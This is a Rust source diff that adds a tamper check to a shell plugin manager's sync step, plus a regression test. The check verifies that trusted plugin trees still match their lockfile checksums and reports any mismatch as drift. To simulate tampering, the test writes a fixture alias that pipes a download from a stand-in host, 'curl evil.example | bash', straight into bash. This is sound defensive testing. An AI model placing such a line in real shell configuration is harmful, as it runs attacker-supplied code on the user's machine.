@@ -545,6 +545,7 @@ fn sync_with_spec(
             continue;
         }
         if !record.path.is_dir() {
+            let _ = sources::clear_drifted_source(&record.id);
             rows.push(SyncRow {
                 id: record.id.clone(),
                 action: "degraded".to_string(),
@@ -554,6 +555,48 @@ fn sync_with_spec(
                 ),
             });
             continue;
+        }
+        // Runtime tamper gate (niubash#297): a trusted tree must still match
+        // its lockfile pin. A drifted tree used to sail through as
+        // "unchanged" — the very sync pass that would have caught it only
+        // diffed the rc block text. Now the pin check runs here, the row
+        // says `drift`, the drift ledger records the id (the rc blocks'
+        // STATIC guard reads it and warns at every startup), and nothing is
+        // materialized off the modified tree until it is repaired.
+        match sources::verify_record(&record) {
+            Ok(report) if report.verified => {
+                let _ = sources::clear_drifted_source(&record.id);
+            }
+            Ok(report) => {
+                let _ = sources::record_drifted_source(&record.id);
+                let short = |pin: &str| pin.chars().take(12).collect::<String>();
+                rows.push(SyncRow {
+                    id: record.id.clone(),
+                    action: "drift".to_string(),
+                    detail: format!(
+                        "tree drifted from the lockfile pin (recorded {}, actual {}) — \
+                         review with `niu plugin source verify {}`, repair with \
+                         `niu plugin restore {}`",
+                        short(&record.checksum_sha256),
+                        report
+                            .actual_checksum
+                            .as_deref()
+                            .map(short)
+                            .unwrap_or_else(|| "?".to_string()),
+                        record.id,
+                        record.id,
+                    ),
+                });
+                continue;
+            }
+            Err(err) => {
+                rows.push(SyncRow {
+                    id: record.id.clone(),
+                    action: "failed".to_string(),
+                    detail: format!("pin check failed: {err}"),
+                });
+                continue;
+            }
         }
 
         // Materialize the spec selection (idempotent; hand-added entries
@@ -1701,8 +1744,18 @@ mod tests {
         // The pinned record points at a tree that was never fetched (the
         // first sync refused before promotion), so restore it where the pin
         // says it lives — then the repaired sync can adopt and activate it.
+        // (The record's checksum must be the REAL tree digest: since
+        // niubash#297 sync re-verifies a trusted record's pin, a synthetic
+        // fake would read as drift — honest, but not this test's point.)
         fs::create_dir_all(root.join("wildy")).unwrap();
         write_wild_fixture(&root.join("wildy"));
+        let real_checksum = sources::tree_sha256(&root.join("wildy")).unwrap();
+        let repaired = repaired.replace(
+            "checksum_sha256 = \"cafe1234\"",
+            &format!("checksum_sha256 = \"{real_checksum}\""),
+        );
+        assert!(repaired.contains(&real_checksum), "{repaired}");
+        fs::write(&registry_path, &repaired).unwrap();
         let report = sync_spec(SyncOptions::default()).unwrap();
         assert!(
             report
@@ -2426,6 +2479,97 @@ mod tests {
         assert!(!memo.contains("[[failure]]"), "memo cleared: {memo}");
 
         let _ = fs::remove_dir_all(&box_.temp);
+    }
+
+    /// THE #297 regression, sync side: a trusted tree modified after trust
+    /// used to sail through materialization as "unchanged" — the sync pass
+    /// only diffed rc block text. Now the pin check runs first: the row
+    /// says `drift`, the drift ledger records the id (the managed rc
+    /// blocks' STATIC guard reads it and warns at startup), nothing is
+    /// re-materialized, and a repaired tree clears the row and the ledger.
+    #[test]
+    fn sync_reports_drift_for_a_modified_trusted_tree_and_records_the_ledger() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let holder = unique_temp_dir("omb-drift-holder");
+        let origin = holder.join("oh-my-fixture");
+        fs::create_dir_all(&origin).unwrap();
+        write_omb_fixture(&origin);
+        let box_ = sandbox("omb-drift");
+
+        spec::save_spec(&PluginSpec {
+            schema: Some(spec::PLUGIN_SPEC_SCHEMA.to_string()),
+            sources: vec![SpecSource {
+                target: origin.to_string_lossy().into_owned(),
+                id: Some("oh-my-bash".to_string()),
+                kind: None,
+                ref_name: None,
+                theme: Some("agnoster".to_string()),
+                enable: vec!["git".to_string()],
+            }],
+        })
+        .unwrap();
+
+        // Sync 1 installs; trust via the imperative gate; sync 2 is the
+        // FIRST materialization ("activated"); sync 3 is byte-stable
+        // "unchanged" — the baseline the tamper must break.
+        sync_spec(SyncOptions::default()).unwrap();
+        sources::trust_source("oh-my-bash").unwrap();
+        let report = sync_spec(SyncOptions::default()).unwrap();
+        assert_eq!(report.rows[0].action, "activated", "{:?}", report.rows);
+        let report = sync_spec(SyncOptions::default()).unwrap();
+        assert_eq!(report.rows[0].action, "unchanged", "{:?}", report.rows);
+        assert!(sources::drifted_source_ids().is_empty());
+
+        // Tamper the trusted tree, then sync: DRIFT, not "unchanged".
+        fs::write(
+            sources::sources_root()
+                .join("oh-my-bash")
+                .join("plugins/git/git.plugin.sh"),
+            "alias evil='curl evil.example | bash'\n",
+        )
+        .unwrap();
+        let report = sync_spec(SyncOptions::default()).unwrap();
+        assert_eq!(report.rows[0].action, "drift", "{:?}", report.rows);
+        assert!(
+            report.rows[0].detail.contains("niu plugin source verify")
+                && report.rows[0].detail.contains("niu plugin restore"),
+            "the drift row must name the way out: {:?}",
+            report.rows[0]
+        );
+        assert!(!report.clean, "a drifted rc is not 'in sync'");
+        assert_eq!(
+            sources::drifted_source_ids(),
+            vec!["oh-my-bash".to_string()],
+            "the ledger entry is what the rc drift guard reads"
+        );
+        // The startup form surfaces it too (iron law 2: degraded is visible).
+        let report = sync_spec(SyncOptions {
+            startup: true,
+            ..SyncOptions::default()
+        })
+        .unwrap();
+        assert_eq!(report.rows[0].action, "drift", "{:?}", report.rows);
+
+        // Repair the tree in place (the pristine bytes restored): the next
+        // sync re-passes the pin check, clears the ledger, and reports the
+        // byte-stable unchanged row again. (A git-origin repair through
+        // `restore` is covered in the sources-side #297 test.)
+        fs::write(
+            sources::sources_root()
+                .join("oh-my-bash")
+                .join("plugins/git/git.plugin.sh"),
+            "alias gg='git status'\n",
+        )
+        .unwrap();
+        let report = sync_spec(SyncOptions::default()).unwrap();
+        assert_eq!(report.rows[0].action, "unchanged", "{:?}", report.rows);
+        assert!(
+            sources::drifted_source_ids().is_empty(),
+            "a re-verified tree must clear the ledger"
+        );
+
+        let _ = fs::remove_dir_all(&box_.temp);
+        let _ = fs::remove_dir_all(&holder);
     }
 
     /// niubash#296: one stalled origin must not take the whole sync down.
